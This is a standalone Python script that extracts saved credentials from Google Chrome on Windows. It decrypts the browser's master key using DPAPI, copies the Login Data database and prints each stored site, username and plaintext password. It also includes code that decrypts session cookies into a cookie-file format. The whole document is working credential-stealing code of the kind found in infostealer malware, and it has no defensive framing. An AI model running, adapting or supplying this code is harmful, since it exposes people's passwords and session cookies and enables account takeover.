import os
import time
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil

def get_master_key(local_state_path):
    with open(os.environ['USERPROFILE'] + os.sep + local_state_path, "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_value(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        return "Error!"

def decrypt_value_all_version(encrypted_value, master_key):
    if encrypted_value[0:3] == b'v10':
        # Chrome > 80
        decrypted_value = decrypt_value(encrypted_value, master_key)
    else:
        # Chrome < 80
        decrypted_value = win32crypt.CryptUnprotectData(encrypted_value)[1].decode()
    return decrypted_value

def timeStamp2time(timestamp):
    timestamp = timestamp // 1000000 - 11644473600
    if timestamp > 0:
        if len(str(timestamp)) > 10:
            timestamp = timestamp / 1000
        else:
            pass
        timeArray = time.localtime(timestamp)
        otherStyleTime = time.strftime("%Y-%m-%d %H:%M:%S", timeArray)
        return otherStyleTime
    else:
        return "Unknown"

def read_db(sql, master_key, typeof):
    conn = sqlite3.connect("temp")
    cursor = conn.cursor()
    try:
        cursor.execute(sql)
        if typeof == "pass":
            print("*******pass**********")
            for r in cursor.fetchall():
                line = r[0] + "  " + r[1] + "  " + decrypt_value_all_version(r[2], master_key)
                print(line)
        if typeof == "cook":
            print("******Cookies**********")
            for r in cursor.fetchall():
                if len(r) == 17:
                    line = ""
                    if str(r[7]).replace(" ", "") == "1":
                        line += "#HttpOnly_"
                    line += r[1].replace(" ", "") + "\t"
                    if str(r[7]).replace(" ", "") == "1":
                        line += "TRUE\t"
                    else:
                        line += "FALSE\t"
                    line += r[4].replace(" ", "") + "\t"
                    if str(r[6]).replace(" ", "") == "1":
                        line += "TRUE\t"
                    else:
                        line += "FALSE\t"
                    webkit_timestamp = timeStamp2time(r[5])
                    line += (webkit_timestamp.replace(" ", "T") + "\t")
                    line += r[2].replace(" ", "") + "\t"
                    line += decrypt_value_all_version(r[12], master_key).replace(" ", "")
                #line = r[0] + "  " + r[1] + "  " + decrypt_value_all_version(r[2], master_key)

                    print(line)
        return 0
    except Exception as e:
        raise e
        return 1
    cursor.close()
    conn.close()

def get_db_data(db_path, sql, typeof, master_key=None):
    target_db = os.environ['USERPROFILE'] + os.sep + db_path
    shutil.copy2(target_db, "temp")
    status = read_db(sql, master_key, typeof)
    if status == 0:
        None
    else:
        print("[!] Error !")
    try:
        os.remove("temp")
    except Exception as e:
        pass

def main():
    chrome_master_key = get_master_key(r"AppData\Local\Google\Chrome\User Data\Local State")
    CHROME_PASSWORDS_DB_PATH = r"AppData\Local\Google\Chrome\User Data\Profile 1\Login Data"
    LOGIN_DATA_SQL = "SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins;"
    get_db_data(CHROME_PASSWORDS_DB_PATH, LOGIN_DATA_SQL, "pass", chrome_master_key)

main()